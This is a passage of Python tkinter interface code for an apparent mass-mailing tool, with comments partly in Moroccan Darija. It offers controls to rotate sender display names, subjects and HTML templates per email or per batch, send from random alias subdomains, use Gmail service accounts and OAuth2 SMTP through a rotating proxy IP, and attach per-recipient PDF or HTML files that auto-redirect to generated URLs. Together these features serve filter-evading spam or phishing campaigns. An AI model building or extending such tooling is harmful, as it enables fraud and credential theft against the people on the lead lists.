                 bg=C["bg1"], fg=C["accent2"], font=("Segoe UI", 7)).pack(anchor="w")
        
        # Rotation strategy l Display Name
        dn_rot_f = tk.Frame(self.dn_random_f, bg=C["bg1"])
        dn_rot_f.pack(fill="x", pady=(4, 0))
        tk.Label(dn_rot_f, text="Rotation:", bg=C["bg1"], fg=C["text3"],
                 font=("Segoe UI", 7)).pack(side="left")
        self.dn_rotation_strategy = tk.StringVar(value="per_email")
        tk.Radiobutton(dn_rot_f, text="Per email (random)", variable=self.dn_rotation_strategy,
                       value="per_email", bg=C["bg1"], fg=C["text2"],
                       selectcolor=C["bg3"], activebackground=C["bg1"],
                       font=("Segoe UI",7)).pack(side="left", padx=(6, 0))
        tk.Radiobutton(dn_rot_f, text="Per N emails (batch)", variable=self.dn_rotation_strategy,
                       value="per_batch", bg=C["bg1"], fg=C["text2"],
                       selectcolor=C["bg3"], activebackground=C["bg1"],
                       font=("Segoe UI",7)).pack(side="left", padx=(6, 0))
        
        # Batch size l Display Name
        dn_bs_f = tk.Frame(self.dn_random_f, bg=C["bg1"])
        dn_bs_f.pack(fill="x", pady=(2, 0))
        tk.Label(dn_bs_f, text="Switch every:", bg=C["bg1"], fg=C["text3"],
                 font=("Segoe UI", 7)).pack(side="left")
        self.dn_batch_size = tk.StringVar(value="1")
        tk.Entry(dn_bs_f, textvariable=self.dn_batch_size, font=("Segoe UI", 8),
                 bg=C["input"], fg=C["text"], insertbackground=C["accent"],
                 relief="flat", bd=0, highlightthickness=1,
                 highlightbackground=C["border2"], width=8).pack(side="left", padx=(6, 0), ipady=3)
        tk.Label(dn_bs_f, text="emails (when batch mode)", bg=C["bg1"], fg=C["text3"],
                 font=("Segoe UI", 7)).pack(side="left", padx=(4, 0))
        
        # Storage l Display Name batch
        self._current_batch_dn = None

        rf1 = tk.Frame(row1, bg=C["bg1"])
        rf1.pack(side="left", fill="x", expand=True)

        subj_hdr = tk.Frame(rf1, bg=C["bg1"])
        subj_hdr.pack(fill="x")
        self._label(subj_hdr, "Subject").pack(side="left")
        self.subj_mode = tk.StringVar(value="random")
        tk.Radiobutton(subj_hdr, text="Manual", variable=self.subj_mode,
                       value="manual", bg=C["bg1"], fg=C["text2"],
                       selectcolor=C["bg3"], activebackground=C["bg1"],
                       font=("Segoe UI",7),
                       command=self._toggle_subj).pack(side="left", padx=(10,2))
        tk.Radiobutton(subj_hdr, text="Random List", variable=self.subj_mode,
                       value="random", bg=C["bg1"], fg=C["text2"],
                       selectcolor=C["bg3"], activebackground=C["bg1"],
                       font=("Segoe UI",7),
                       command=self._toggle_subj).pack(side="left")

        self.subj_manual_f = tk.Frame(rf1, bg=C["bg1"])
        self.subj_manual_f.pack(fill="x")
        self.subject = self._entry_w(self.subj_manual_f)

        # Random subjects: integrated textbox UNLIMITED
        self.subj_random_f = tk.Frame(rf1, bg=C["bg1"])
        
        # Buttons row
        subj_btns = tk.Frame(self.subj_random_f, bg=C["bg1"])
        subj_btns.pack(fill="x", pady=(2, 2))
        tk.Button(subj_btns, text="📂 Import .txt", bg=C["bg3"], fg=C["text2"],
                  relief="flat", bd=0, cursor="hand2", font=("Segoe UI", 7),
                  command=self._import_subjects).pack(side="left", ipady=2, ipadx=6, padx=(0, 4))
        tk.Button(subj_btns, text="🗑 Clear", bg=C["bg3"], fg=C["red"],
                  relief="flat", bd=0, cursor="hand2", font=("Segoe UI", 7),
                  command=self._clear_subjects).pack(side="left", ipady=2, ipadx=6)
        self.subj_count_lbl = tk.Label(subj_btns, text="0 subjects", bg=C["bg1"], fg=C["text3"], font=("Segoe UI", 7))
        self.subj_count_lbl.pack(side="left", padx=(8, 0))
        
        # Big textbox (1 subject per line, unlimited)
        self.subj_text = tk.Text(self.subj_random_f, height=4, bg=C["input"], fg=C["text"],
                                  font=("Segoe UI", 8), insertbackground=C["accent"],
                                  relief="flat", bd=0,
                                  highlightthickness=1, highlightbackground=C["border2"])
        self.subj_text.pack(fill="x", pady=(0, 2), ipady=2)
        self.subj_text.bind("<KeyRelease>", lambda e: self._update_subj_count())
        
        tk.Label(self.subj_random_f, text="💡 Khalliha fargha = Auto-generate ♾️ unlimited subjects · Wla type/import dyalek",
                 bg=C["bg1"], fg=C["accent2"], font=("Segoe UI", 7)).pack(anchor="w")
        
        # Rotation strategy l Subject
        subj_rot_f = tk.Frame(self.subj_random_f, bg=C["bg1"])
        subj_rot_f.pack(fill="x", pady=(4, 0))
        tk.Label(subj_rot_f, text="Rotation:", bg=C["bg1"], fg=C["text3"],
                 font=("Segoe UI", 7)).pack(side="left")
        self.subj_rotation_strategy = tk.StringVar(value="per_email")
        tk.Radiobutton(subj_rot_f, text="Per email (random)", variable=self.subj_rotation_strategy,
                       value="per_email", bg=C["bg1"], fg=C["text2"],
                       selectcolor=C["bg3"], activebackground=C["bg1"],
                       font=("Segoe UI",7)).pack(side="left", padx=(6, 0))
        tk.Radiobutton(subj_rot_f, text="Per N emails (batch)", variable=self.subj_rotation_strategy,
                       value="per_batch", bg=C["bg1"], fg=C["text2"],
                       selectcolor=C["bg3"], activebackground=C["bg1"],
                       font=("Segoe UI",7)).pack(side="left", padx=(6, 0))
        
        # Batch size l Subject
        subj_bs_f = tk.Frame(self.subj_random_f, bg=C["bg1"])
        subj_bs_f.pack(fill="x", pady=(2, 0))
        tk.Label(subj_bs_f, text="Switch every:", bg=C["bg1"], fg=C["text3"],
                 font=("Segoe UI", 7)).pack(side="left")
        self.subj_batch_size = tk.StringVar(value="1")
        tk.Entry(subj_bs_f, textvariable=self.subj_batch_size, font=("Segoe UI", 8),
                 bg=C["input"], fg=C["text"], insertbackground=C["accent"],
                 relief="flat", bd=0, highlightthickness=1,
                 highlightbackground=C["border2"], width=8).pack(side="left", padx=(6, 0), ipady=3)
        tk.Label(subj_bs_f, text="emails (when batch mode)", bg=C["bg1"], fg=C["text3"],
                 font=("Segoe UI", 7)).pack(side="left", padx=(4, 0))
        
        # Storage l Subject batch
        self._current_batch_subj = None

        # Body section m3a radio Manual / Random Templates Integrated
        body_hdr = tk.Frame(cpad, bg=C["bg1"])
        body_hdr.pack(fill="x")
        self._label(body_hdr, "Body").pack(side="left")
        self.body_mode = tk.StringVar(value="random")
        tk.Radiobutton(body_hdr, text="Manual", variable=self.body_mode,
                       value="manual", bg=C["bg1"], fg=C["text2"],
                       selectcolor=C["bg3"], activebackground=C["bg1"],
                       font=("Segoe UI",7),
                       command=self._toggle_body).pack(side="left", padx=(10,2))
        tk.Radiobutton(body_hdr, text="Random Templates", variable=self.body_mode,
                       value="random", bg=C["bg1"], fg=C["text2"],
                       selectcolor=C["bg3"], activebackground=C["bg1"],
                       font=("Segoe UI",7),
                       command=self._toggle_body).pack(side="left")
        
        # Manual body frame (single text)
        self.body_manual_f = tk.Frame(cpad, bg=C["bg1"])
        self.body_manual_f.pack(fill="x")
        self.body = self._text_w(self.body_manual_f, height=5)
        
        # Random body frame: INTEGRATED unlimited templates
        self.body_random_f = tk.Frame(cpad, bg=C["bg1"])
        
        # Buttons row
        body_btns = tk.Frame(self.body_random_f, bg=C["bg1"])
        body_btns.pack(fill="x", pady=(2, 4))
        
        tk.Button(body_btns, text="➕ Add Template", bg=C["green"], fg="white",
                  relief="flat", bd=0, cursor="hand2", font=("Segoe UI", 8, "bold"),
                  command=self._add_template).pack(side="left", ipady=4, ipadx=10, padx=(0, 4))
        
        tk.Button(body_btns, text="📂 Import Folder", bg=C["bg3"], fg=C["text2"],
                  relief="flat", bd=0, cursor="hand2", font=("Segoe UI", 8),
                  command=self._load_templates_folder).pack(side="left", ipady=4, ipadx=8, padx=(0, 4))
        
        tk.Button(body_btns, text="📂 Import .html", bg=C["bg3"], fg=C["text2"],
                  relief="flat", bd=0, cursor="hand2", font=("Segoe UI", 8),
                  command=self._import_template_file).pack(side="left", ipady=4, ipadx=8, padx=(0, 4))
        
        tk.Button(body_btns, text="🗑 Clear All", bg=C["bg3"], fg=C["red"],
                  relief="flat", bd=0, cursor="hand2", font=("Segoe UI", 8),
                  command=self._clear_templates).pack(side="left", ipady=4, ipadx=8)
        
        self.body_count_lbl = tk.Label(body_btns, text="0 templates", bg=C["bg1"],
                                         fg=C["text3"], font=("Segoe UI", 8))
        self.body_count_lbl.pack(side="left", padx=(10, 0))
        
        # Templates listbox - shows ga3 templates added
        list_wrap = tk.Frame(self.body_random_f, bg=C["bg1"])
        list_wrap.pack(fill="x", pady=(0, 4))
        
        scrollbar = tk.Scrollbar(list_wrap)
        scrollbar.pack(side="right", fill="y")
        
        self.body_listbox = tk.Listbox(list_wrap, height=4, bg=C["input"], fg=C["text"],
                                         selectbackground=C["accent"], font=("Segoe UI", 8),
                                         relief="flat", borderwidth=0, highlightthickness=1,
                                         highlightbackground=C["border2"],
                                         yscrollcommand=scrollbar.set)
        self.body_listbox.pack(side="left", fill="x", expand=True)
        scrollbar.config(command=self.body_listbox.yview)
        
        # Right-click & double-click bindings
        self.body_listbox.bind("<Button-3>", self._template_right_click)
        self.body_listbox.bind("<Double-Button-1>", self._template_view)
        
        # Hint
        tk.Label(self.body_random_f,
                 text="💡 Khalliha fargha = Auto-generate ♾️ unlimited HTML templates · Wla zid dyalek (➕)",
                 bg=C["bg1"], fg=C["accent2"], font=("Segoe UI", 7)).pack(anchor="w", pady=(0, 4))
        
        # Rotation strategy
        rot_f = tk.Frame(self.body_random_f, bg=C["bg1"])
        rot_f.pack(fill="x", pady=(4, 0))
        tk.Label(rot_f, text="Rotation:", bg=C["bg1"], fg=C["text3"],
                 font=("Segoe UI", 7)).pack(side="left")
        self.body_rotation_strategy = tk.StringVar(value="per_email")
        tk.Radiobutton(rot_f, text="Per email (random)", variable=self.body_rotation_strategy,
                       value="per_email", bg=C["bg1"], fg=C["text2"],
                       selectcolor=C["bg3"], activebackground=C["bg1"],
                       font=("Segoe UI",7)).pack(side="left", padx=(6, 0))
        tk.Radiobutton(rot_f, text="Per N emails (batch)", variable=self.body_rotation_strategy,
                       value="per_batch", bg=C["bg1"], fg=C["text2"],
                       selectcolor=C["bg3"], activebackground=C["bg1"],
                       font=("Segoe UI",7)).pack(side="left", padx=(6, 0))
        
        # Batch size
        bs_f = tk.Frame(self.body_random_f, bg=C["bg1"])
        bs_f.pack(fill="x", pady=(2, 0))
        tk.Label(bs_f, text="Switch every:", bg=C["bg1"], fg=C["text3"],
                 font=("Segoe UI", 7)).pack(side="left")
        self.body_batch_size = tk.StringVar(value="1")
        tk.Entry(bs_f, textvariable=self.body_batch_size, font=("Segoe UI", 8),
                 bg=C["input"], fg=C["text"], insertbackground=C["accent"],
                 relief="flat", bd=0, highlightthickness=1,
                 highlightbackground=C["border2"], width=8).pack(side="left", padx=(6, 0), ipady=3)
        tk.Label(bs_f, text="emails (when batch mode)", bg=C["bg1"], fg=C["text3"],
                 font=("Segoe UI", 7)).pack(side="left", padx=(4, 0))
        
        # Storage
        self.body_templates_list = []  # list dyal {filename, content}
        self._current_batch_template = None  # l per_batch mode

        # ─── FROM EMAIL ROW (l alias / custom From) ────────────
        from_row = tk.Frame(cpad, bg=C["bg1"])
        from_row.pack(fill="x", pady=(8, 0))
        
        # Header m3a checkbox
        from_hdr = tk.Frame(from_row, bg=C["bg1"])
        from_hdr.pack(fill="x")
        
        self._label(from_hdr, "From Email (alias / custom)").pack(side="left")
        
        self.use_custom_from = tk.BooleanVar(value=False)
        tk.Checkbutton(from_hdr, text="Enable Random From",
                       variable=self.use_custom_from,
                       bg=C["bg1"], fg=C["green"],
                       selectcolor=C["bg3"], activebackground=C["bg1"],
                       font=("Segoe UI", 8, "bold")).pack(side="left", padx=(15, 0))
        
        # Mini info
        tk.Label(from_row,
                 text="Format: alias subdomain wahed l kol line (mathalan: mail.terssadmine.com)",
                 bg=C["bg1"], fg=C["text3"], font=("Segoe UI", 7)).pack(anchor="w", pady=(2, 2))
        
        # Textbox l aliases
        from_box_frame = tk.Frame(from_row, bg=C["bg1"])
        from_box_frame.pack(fill="x")
        
        self.from_aliases_text = tk.Text(
            from_box_frame, height=4, bg=C["input"], fg=C["text"],
            font=("Consolas", 8), insertbackground=C["accent"],
            relief="flat", bd=0,
            highlightthickness=1, highlightbackground=C["border2"]
        )
        self.from_aliases_text.pack(side="left", fill="both", expand=True, ipady=2)
        
        # Buttons mini
        from_btns = tk.Frame(from_box_frame, bg=C["bg1"])
        from_btns.pack(side="left", fill="y", padx=(4, 0))
        
        tk.Button(from_btns, text="📂", bg=C["bg3"], fg=C["text2"],
                  relief="flat", bd=0, cursor="hand2", font=("Segoe UI", 9),
                  command=self._load_from_aliases).pack(fill="x", pady=(0, 2), ipady=4, ipadx=4)
        
        tk.Button(from_btns, text="🗑", bg=C["bg3"], fg=C["red"],
                  relief="flat", bd=0, cursor="hand2", font=("Segoe UI", 9),
                  command=lambda: self.from_aliases_text.delete("1.0", "end")).pack(fill="x", ipady=4, ipadx=4)


    def _build_sender_tab(self, parent):
        main = tk.Frame(parent, bg=C["bg0"])
        main.pack(fill="both", expand=True)

        # LEFT
        left = tk.Frame(main, bg=C["bg1"], width=265)
        left.pack(side="left", fill="y", padx=(0,12))
        left.pack_propagate(False)
        lpad = tk.Frame(left, bg=C["bg1"])
        lpad.pack(fill="both", expand=True, padx=14, pady=14)

        self._sec(lpad, "Service Account")
        self._label(lpad, "JSON Key File").pack(anchor="w")
        sa_row = tk.Frame(lpad, bg=C["bg1"])
        sa_row.pack(fill="x", pady=(2,8))
        self.sa_entry = tk.Entry(sa_row, font=("Segoe UI",8),
                                  bg=C["input"], fg=C["text2"],
                                  insertbackground=C["accent"],
                                  relief="flat", bd=0,
                                  highlightthickness=1,
                                  highlightbackground=C["border2"],
                                  textvariable=self.sa_file)
        self.sa_entry.pack(side="left", fill="x", expand=True, ipady=5)
        tk.Button(sa_row, text="📂", bg=C["bg3"], fg=C["text2"],
                  relief="flat", bd=0, cursor="hand2",
                  command=self._browse_sa).pack(side="left", padx=(4,0))

        self._sec(lpad, "Gmail API Senders")
        self._label(lpad, "Email addresses (1 per line)").pack(anchor="w")
        self.senders_text = tk.Text(lpad, font=("Segoe UI",9),
                                     bg=C["input"], fg=C["text"],
                                     insertbackground=C["accent"],
                                     relief="flat", bd=0,
                                     highlightthickness=1,
                                     highlightbackground=C["border2"],
                                     height=4, wrap="none")
        self.senders_text.pack(fill="x", pady=(2,8))
        ABtn(lpad, "⚡ Connect All", C["accent"], self._connect_all, w=140).pack(anchor="w", pady=(0,4))
        self.connect_status = self._label(lpad, "", size=8)
        self.connect_status.pack(anchor="w")

        # ── OAuth2 SMTP section ──────────────────────────────────
        self._sec(lpad, "OAuth2 SMTP Senders")
        self._label(lpad, "Service Account JSON (per sender)").pack(anchor="w")
        oa_row = tk.Frame(lpad, bg=C["bg1"])
        oa_row.pack(fill="x", pady=(2,4))
        self.oa_file = tk.StringVar()
        oa_entry = tk.Entry(oa_row, font=("Segoe UI",8),
                            bg=C["input"], fg=C["text2"],
                            insertbackground=C["accent"],
                            relief="flat", bd=0,
                            highlightthickness=1,
                            highlightbackground=C["border2"],
                            textvariable=self.oa_file)
        oa_entry.pack(side="left", fill="x", expand=True, ipady=5)
        tk.Button(oa_row, text="📂", bg=C["bg3"], fg=C["text2"],
                  relief="flat", bd=0, cursor="hand2",
                  command=self._browse_oa_sa).pack(side="left", padx=(4,0))
        self._label(lpad, "Email addresses (1 per line)").pack(anchor="w")
        self.oa_senders_text = tk.Text(lpad, font=("Segoe UI",9),
                                        bg=C["input"], fg=C["text"],
                                        insertbackground=C["accent"],
                                        relief="flat", bd=0,
                                        highlightthickness=1,
                                        highlightbackground=C["border2"],
                                        height=3, wrap="none")
        self.oa_senders_text.pack(fill="x", pady=(2,6))
        ABtn(lpad, "⚡ Connect OAuth2", C["purple"], self._connect_oauth2, w=150).pack(anchor="w", pady=(0,4))
        self.oa_connect_status = self._label(lpad, "", size=8)
        self.oa_connect_status.pack(anchor="w")

        # Sender mode
        self._sec(lpad, "Send Mode")
        self.send_mode = tk.StringVar(value="oauth2_smtp")
        for val, txt in [("api","Gmail API only"),("smtp","SMTP only"),("mixed","Mixed (API + SMTP)"),("oauth2_smtp","OAuth2 SMTP (XOAUTH2)"),("workspace_smtp","Workspace SMTP (proxy IP)"),("resend","📨 Resend API")]:
            tk.Radiobutton(lpad, text=txt, variable=self.send_mode,
                           value=val, bg=C["bg1"], fg=C["text2"],
                           selectcolor=C["bg3"], activebackground=C["bg1"],
                           font=("Segoe UI",8)).pack(anchor="w")

        # Stats
        self._sec(lpad, "Stats")
        stats_wrap = tk.Frame(lpad, bg=C["bg1"])
        stats_wrap.pack(fill="x")
        stats_f = tk.Frame(stats_wrap, bg=C["bg1"])
        stats_f.pack(fill="x")
        self.stat_sent = self._make_stat(stats_f, "Sent", "0", C["green"])
        self.stat_fail = self._make_stat(stats_f, "Failed", "0", C["red"])
        self._refresh_sent_stat()

        reset_stats_row = tk.Frame(stats_wrap, bg=C["bg1"])
        reset_stats_row.pack(anchor="w", pady=(4,0))
        tk.Button(reset_stats_row, text="Reset Sent", bg=C["bg3"], fg=C["text2"],
                  relief="flat", bd=0, cursor="hand2", font=("Segoe UI",7),
                  command=self._reset_sent_total).pack(side="left", ipady=2, ipadx=6)

        # 🌐 LIVE IP WIDGET (proxy)
        self._sec(lpad, "🌐 Live Proxy IP")
        ip_box = tk.Frame(lpad, bg=C["bg2"], padx=10, pady=8)
        ip_box.pack(fill="x", pady=(2, 4))
        
        self.live_ip_lbl = tk.Label(ip_box, text="—",
                                     bg=C["bg2"], fg=C["accent2"],
                                     font=("Consolas", 10, "bold"),
                                     wraplength=210, justify="left", anchor="w")
        self.live_ip_lbl.pack(fill="x")
        
        self.live_ip_status = tk.Label(ip_box, text="Proxy disabled",
                                        bg=C["bg2"], fg=C["text3"],
                                        font=("Segoe UI", 7), anchor="w")
        self.live_ip_status.pack(fill="x", pady=(2, 0))
        
        # Refresh button row
        ip_row = tk.Frame(lpad, bg=C["bg1"])
        ip_row.pack(fill="x", pady=(0, 4))
        tk.Button(ip_row, text="🔄 Refresh IP", bg=C["bg3"], fg=C["accent2"],
                  relief="flat", bd=0, cursor="hand2", font=("Segoe UI", 7),
                  command=self._refresh_live_ip).pack(side="left", ipady=3, ipadx=8)
        
        # Auto-refresh tick (every 5s when send is active)
        self._start_live_ip_tick()

        # Resume info
        self.resume_lbl = self._label(lpad, "", size=8, color=C["yellow"])
        self.resume_lbl.pack(anchor="w", pady=(8,0))

        # RIGHT
        right = tk.Frame(main, bg=C["bg0"])
        right.pack(side="left", fill="both", expand=True)

        # BOTTOM
        bot = tk.Frame(right, bg=C["bg0"])
        bot.pack(fill="both", expand=True)

        # 📎 RANDOM ATTACHMENTS section
        att_f = tk.Frame(bot, bg=C["bg1"], width=260)
        att_f.pack(side="left", fill="y", padx=(0,10))
        att_f.pack_propagate(False)
        apad = tk.Frame(att_f, bg=C["bg1"])
        apad.pack(fill="both", expand=True, padx=12, pady=12)
        self._sec(apad, "📎 Random Attachments")
        
        if not hasattr(self, 'att_mode'):
            self.att_mode = tk.StringVar(value="random")
        if not hasattr(self, 'attachment_files'):
            self.attachment_files = []
        
        for val, txt in [("random","Random per lead"),
                         ("same","Same for all"),
                         ("none","No random")]:
            tk.Radiobutton(apad, text=txt, variable=self.att_mode,
                           value=val, bg=C["bg1"], fg=C["text2"],
                           selectcolor=C["bg3"], activebackground=C["bg1"],
                           font=("Segoe UI",8)).pack(anchor="w")
        
        self.att_listbox = tk.Listbox(apad, font=("Segoe UI",8),
                                       bg=C["input"], fg=C["text2"],
                                       selectbackground=C["accent"],
                                       relief="flat", bd=0,
                                       highlightthickness=1,
                                       highlightbackground=C["border2"])
        self.att_listbox.pack(fill="both", expand=True, pady=(6,6))
        # Re-populate
        for f in self.attachment_files:
            self.att_listbox.insert("end", os.path.basename(f))
        
        abr = tk.Frame(apad, bg=C["bg1"])
        abr.pack(fill="x")
        for txt, cmd, fg in [("+ Files",self._add_att,C["text2"]),
                               ("+ Folder",self._add_folder,C["text2"]),
                               ("Clear",self._clear_att,C["red"])]:
            tk.Button(abr, text=txt, bg=C["bg3"], fg=fg,
                      relief="flat", bd=0, cursor="hand2", font=("Segoe UI",8),
                      command=cmd).pack(side="left", ipady=4, ipadx=6, padx=(0,3))
        self.att_count_lbl = self._label(apad, f"{len(self.attachment_files)} files",
                                           size=8, color=C["text3"])
        self.att_count_lbl.pack(anchor="w", pady=(4,0))
        
        # 📌 Fixed Atts moved to dedicated tab — just init storage here
        if not hasattr(self, 'fixed_attachment_files'):
            self.fixed_attachment_files = []
        
        # 📄 AUTO ATTACHMENT section (PDF or HTML)
        auto_html_f = tk.Frame(bot, bg=C["bg1"], width=300)
        auto_html_f.pack(side="left", fill="y", padx=(0,10))
        auto_html_f.pack_propagate(False)
        ahpad = tk.Frame(auto_html_f, bg=C["bg1"])
        ahpad.pack(fill="both", expand=True, padx=12, pady=12)
        self._sec(ahpad, "📎 Auto Attachment")
        
        # Toggle
        if not hasattr(self, 'auto_html_enabled'):
            self.auto_html_enabled = tk.BooleanVar(value=False)
        toggle_row = tk.Frame(ahpad, bg=C["bg1"])
        toggle_row.pack(fill="x", pady=(0, 4))
        tk.Checkbutton(toggle_row, text="Enable Auto Attachment",
                       variable=self.auto_html_enabled,
                       bg=C["bg1"], fg=C["green"], activeforeground=C["green"],
                       selectcolor=C["bg3"], activebackground=C["bg1"],
                       font=("Segoe UI", 9, "bold")).pack(side="left")
        
        # 🆕 PDF / HTML / Direct format toggle (uniform pro buttons)
        if not hasattr(self, 'auto_format'):
            self.auto_format = tk.StringVar(value="pdf")
        
        format_row = tk.Frame(ahpad, bg=C["bg2"])
        format_row.pack(fill="x", pady=(4, 6))
        format_inner = tk.Frame(format_row, bg=C["bg2"])
        format_inner.pack(fill="x", padx=8, pady=8)
        
        self._format_buttons = {}
        for code, label, icon in [
            ("pdf",    "PDF",    "📄"),
            ("html",   "HTML",   "📋"),
            ("direct", "Direct", "⚡"),
        ]:
            btn = tk.Button(format_inner,
                             text=f"{icon} {label}",
                             bg=C["green"] if code == "pdf" else C["bg3"],
                             fg="#000" if code == "pdf" else C["text"],
                             relief="flat", bd=0, cursor="hand2",
                             font=("Segoe UI", 9, "bold"),
                             command=lambda c=code: self._set_auto_format(c))
            btn.pack(side="left", ipady=5, ipadx=12, padx=(0, 4))
            self._format_buttons[code] = btn
        
        tk.Label(ahpad,
                 text="Per email = unique PDF/HTML\nm3a [NAME] [EMAIL] + auto-redirect",
                 bg=C["bg1"], fg=C["accent2"], font=("Segoe UI", 7),
                 justify="left").pack(anchor="w", pady=(0, 4))
        
        # reportlab status
        if PDF_OK:
            tk.Label(ahpad, text="✅ reportlab installed",
                     bg=C["bg1"], fg=C["green"],
                     font=("Segoe UI", 7, "bold")).pack(anchor="w", pady=(0, 4))
        else:
            tk.Label(ahpad, text="⚠ reportlab missing (HTML still works)",
                     bg=C["bg1"], fg=C["yellow"],
                     font=("Segoe UI", 7, "bold")).pack(anchor="w", pady=(0, 4))
        
        # Links input
        tk.Label(ahpad, text="🔗 Links (1 per line):",
                 bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 8)).pack(anchor="w")
        
        self.auto_html_links_text = tk.Text(ahpad, font=("Segoe UI", 8),
                                              bg=C["input"], fg=C["text"],
                                              insertbackground=C["accent"],
                                              relief="flat", bd=0, height=4,
                                              highlightthickness=1,
                                              highlightbackground=C["border2"],
                                              wrap="none")
        self.auto_html_links_text.pack(fill="both", expand=True, pady=(2, 4))
        
        # URL Generator
        gen_box = tk.Frame(ahpad, bg=C["bg2"])
        gen_box.pack(fill="x", pady=(0, 4))
        gen_inner = tk.Frame(gen_box, bg=C["bg2"])
        gen_inner.pack(fill="x", padx=8, pady=6)
        
        tk.Label(gen_inner, text="🛠️ URL Generator (1 → N):",
                 bg=C["bg2"], fg=C["accent2"],
                 font=("Segoe UI", 7, "bold")).pack(anchor="w")
        
        if not hasattr(self, 'gen_base_url'):
            self.gen_base_url = tk.StringVar(value="https://domain.com/")
        tk.Entry(gen_inner, textvariable=self.gen_base_url,
                 font=("Segoe UI", 8),
                 bg=C["input"], fg=C["text"],
                 insertbackground=C["accent"],
                 relief="flat", bd=0,
                 highlightthickness=1,
                 highlightbackground=C["border2"]).pack(fill="x", ipady=3, pady=(2, 4))
        
        range_row = tk.Frame(gen_inner, bg=C["bg2"])
        range_row.pack(fill="x")
        tk.Label(range_row, text="From:", bg=C["bg2"], fg=C["text3"],
                 font=("Segoe UI", 7)).pack(side="left", padx=(0, 2))
        if not hasattr(self, 'gen_start'):
            self.gen_start = tk.IntVar(value=1)
        tk.Entry(range_row, textvariable=self.gen_start,
                 font=("Segoe UI", 8), width=5,
                 bg=C["input"], fg=C["text"], insertbackground=C["accent"],
                 relief="flat", bd=0, highlightthickness=1,
                 highlightbackground=C["border2"]).pack(side="left", ipady=2, padx=(0, 4))
        
        tk.Label(range_row, text="To:", bg=C["bg2"], fg=C["text3"],
                 font=("Segoe UI", 7)).pack(side="left", padx=(0, 2))
        if not hasattr(self, 'gen_end'):
            self.gen_end = tk.IntVar(value=500)
        tk.Entry(range_row, textvariable=self.gen_end,
                 font=("Segoe UI", 8), width=5,
                 bg=C["input"], fg=C["text"], insertbackground=C["accent"],
                 relief="flat", bd=0, highlightthickness=1,
                 highlightbackground=C["border2"]).pack(side="left", ipady=2, padx=(0, 4))
        
        tk.Button(range_row, text="⚡", bg=C["green"], fg="#000",
                  relief="flat", bd=0, cursor="hand2",
                  font=("Segoe UI", 8, "bold"),
                  command=self._generate_url_list).pack(side="left", ipady=3, ipadx=6)
        
        # Filename
        tk.Label(ahpad, text="📄 Filename (empty = random COLA):",
                 bg=C["bg1"], fg=C["text3"],
                 font=("Segoe UI", 7)).pack(anchor="w", pady=(4, 0))
        
        if not hasattr(self, 'auto_html_filename'):
            self.auto_html_filename = tk.StringVar(value="")
        tk.Entry(ahpad, textvariable=self.auto_html_filename,
                 font=("Segoe UI", 8),
                 bg=C["input"], fg=C["text"],
                 insertbackground=C["accent"],
                 relief="flat", bd=0,
                 highlightthickness=1,
                 highlightbackground=C["border2"]).pack(fill="x", ipady=3, pady=(2, 4))
        
        # Buttons
        ah_btns = tk.Frame(ahpad, bg=C["bg1"])
        ah_btns.pack(fill="x")
        tk.Button(ah_btns, text="📂 Import",
                  bg=C["bg3"], fg=C["text2"],
                  relief="flat", bd=0, cursor="hand2",
                  font=("Segoe UI", 9, "bold"),
                  command=self._import_auto_html_links).pack(side="left", ipady=7, ipadx=12, padx=(0, 4))
        tk.Button(ah_btns, text="🧪 Preview",
                  bg=C["bg3"], fg=C["accent2"],
                  relief="flat", bd=0, cursor="hand2",
                  font=("Segoe UI", 9, "bold"),
                  command=self._preview_auto_html).pack(side="left", ipady=7, ipadx=12, padx=(0, 4))
        tk.Button(ah_btns, text="📦 Gen ZIP",
                  bg=C["green"], fg="#000",
                  relief="flat", bd=0, cursor="hand2",
                  font=("Segoe UI", 9, "bold"),
                  command=self._generate_zip_pdfs).pack(side="left", ipady=7, ipadx=12, padx=(0, 4))
        tk.Button(ah_btns, text="🗑",
                  bg=C["bg3"], fg=C["red"],
                  relief="flat", bd=0, cursor="hand2",
                  font=("Segoe UI", 10, "bold"),
                  command=lambda: self.auto_html_links_text.delete("1.0", "end")).pack(side="left", ipady=7, ipadx=10)
        
        self.auto_html_count_lbl = self._label(ahpad, "0 links", size=7, color=C["text3"])
        self.auto_html_count_lbl.pack(anchor="w", pady=(4, 0))
        self.auto_html_links_text.bind("<KeyRelease>", self._update_auto_html_count)
        
        self.zip_status_lbl = self._label(ahpad, "No ZIP yet", size=7, color=C["text3"])
        self.zip_status_lbl.pack(anchor="w", pady=(2, 0))
        
        # Leads (akbar)
        leads_f = tk.Frame(bot, bg=C["bg1"], width=300)
        leads_f.pack(side="left", fill="y", padx=(0,10))
        leads_f.pack_propagate(False)
        lfpad = tk.Frame(leads_f, bg=C["bg1"])
        lfpad.pack(fill="both", expand=True, padx=12, pady=12)
        self._sec(lfpad, "Leads")
        self._label(lfpad, "Recipient emails (1 per line)").pack(anchor="w")
        self.leads_text = tk.Text(lfpad, font=("Segoe UI",9),
                                   bg=C["input"], fg=C["text"],
                                   insertbackground=C["accent"],
                                   relief="flat", bd=0,
                                   highlightthickness=1,
                                   highlightbackground=C["border2"],
                                   wrap="none")
        self.leads_text.pack(fill="both", expand=True, pady=(2,6))
        lbr = tk.Frame(lfpad, bg=C["bg1"])
        lbr.pack(fill="x")
        tk.Button(lbr, text="Import .txt", bg=C["bg3"], fg=C["text2"],
                  relief="flat", bd=0, cursor="hand2", font=("Segoe UI",8),
                  command=self._import_leads).pack(side="left", ipady=4, ipadx=8, padx=(0,6))
        self.lead_count = self._label(lbr, "0 leads", size=8, color=C["text3"])
        self.lead_count.pack(side="left")
        self.leads_text.bind("<KeyRelease>", self._update_lead_count)

        # Actions + Console
        action = tk.Frame(bot, bg=C["bg0"])
        action.pack(side="left", fill="both", expand=True)

        # 🎯 SEND CONTROL BUTTONS — kbar w professional!
        btn_card = tk.Frame(action, bg=C["bg1"])
        btn_card.pack(fill="x", pady=(0, 12))
        btn_inner = tk.Frame(btn_card, bg=C["bg1"])
        btn_inner.pack(fill="x", padx=14, pady=12)
        
        btn_row = tk.Frame(btn_inner, bg=C["bg1"])
        btn_row.pack(fill="x")
        
        # Send button (kbir + accent)
        self.send_btn = tk.Button(btn_row, text="▶  Send",
                                    bg=C["accent"], fg="#fff",
                                    relief="flat", bd=0, cursor="hand2",
                                    font=("Segoe UI", 12, "bold"),
                                    width=10,
                                    command=self._start_send)
        self.send_btn.pack(side="left", ipady=10, padx=(0, 8))
        
        # Pause
        self.pause_btn = tk.Button(btn_row, text="⏸  Pause",
